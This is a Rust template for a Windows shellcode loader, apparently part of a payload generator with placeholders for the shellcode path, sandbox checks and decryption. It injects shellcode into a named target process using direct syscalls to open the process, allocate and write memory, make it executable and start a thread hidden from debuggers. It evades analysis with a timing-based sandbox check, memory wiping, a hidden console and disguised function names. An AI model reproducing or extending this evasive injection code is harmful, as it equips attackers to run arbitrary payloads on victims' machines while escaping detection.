#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use sysinfo::System;
use std::include_bytes;
use dyncvoke::dyncvoke_core::syscall;

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, PROCESS_ALL_ACCESS}
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
    }
};
use winapi::ctypes::c_void;
use winapi::um::winnt::PAGE_EXECUTE_READ;
use winapi::um::winnt::THREAD_ALL_ACCESS;
use std::{ptr::null_mut};
use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntpsapi::THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER;
use winapi::shared::ntdef::NULL;

use std::time::Instant;

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn boxboxbox(tar: &str) -> Vec<usize> {
    let mut dom: Vec<usize> = Vec::new();
    let s = System::new_all();
    let tar_lower = tar.to_lowercase();
    for (_, pro) in s.processes() {
        if pro.name().to_string_lossy().to_lowercase() == tar_lower {
            dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
        }
    }
    dom
}

fn pause(ms: i64) {
    let interval: i64 = -(ms * 10_000);
    let _ = syscall!("NtDelayExecution", 0u32, &interval as *const i64);
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

fn enhance(mut buf: Vec<u8>, tar: usize) {
    let mut process_handle = tar as HANDLE;
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut ci = CLIENT_ID {
        UniqueProcess: process_handle,
        UniqueThread: null_mut(),
    };

    unsafe {
        let s = syscall!("NtOpenProcess",
            &mut process_handle as *mut HANDLE,
            PROCESS_ALL_ACCESS,
            &mut oa as *mut OBJECT_ATTRIBUTES,
            &mut ci as *mut CLIENT_ID
        ).unwrap_or(-1);
        if !NT_SUCCESS(s) { return; }

        pause(150);
        {{NT_DELAY_STEP}}

        let mut base: *mut c_void = null_mut();
        let mut size: usize = buf.len();
        let s = syscall!("NtAllocateVirtualMemory",
            process_handle,
            &mut base as *mut *mut c_void,
            0usize,
            &mut size as *mut usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        ).unwrap_or(-1);
        if !NT_SUCCESS(s) { return; }

        pause(200);
        {{NT_DELAY_STEP}}

        let buf_len = buf.len();
        let mut written: usize = 0;
        let s = syscall!("NtWriteVirtualMemory",
            process_handle,
            base,
            buf.as_mut_ptr() as *mut c_void,
            buf_len,
            &mut written as *mut usize
        ).unwrap_or(-1);
        if !NT_SUCCESS(s) { return; }

        wipe(&mut buf);
        pause(150);
        {{NT_DELAY_STEP}}

        let mut old_perms = PAGE_READWRITE;
        let mut psize = buf_len;
        let s = syscall!("NtProtectVirtualMemory",
            process_handle,
            &mut base as *mut *mut c_void,
            &mut psize as *mut usize,
            PAGE_EXECUTE_READ,
            &mut old_perms as *mut u32
        ).unwrap_or(-1);
        if !NT_SUCCESS(s) { return; }

        pause(100);
        {{NT_DELAY_STEP}}
        {{NT_DELAY_FINAL}}

        let mut thread_handle: *mut c_void = null_mut();
        let _ = syscall!("NtCreateThreadEx",
            &mut thread_handle as *mut *mut c_void,
            THREAD_ALL_ACCESS,
            NULL,
            process_handle,
            base,
            NULL,
            THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
            0usize,
            0usize,
            0usize,
            NULL
        );
    }
}

fn main() {
    {{NT_DELAY_AT_START}}
    {{SANDBOX}}

    if !check_environment() { return; }

    let tar: &str = "{{TARGET_PROCESS}}";

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    let list: Vec<usize> = boxboxbox(tar);
    if !list.is_empty() {
        for i in &list {
            enhance(vec.clone(), *i);
        }
    }
}

{{DLL_MAIN}}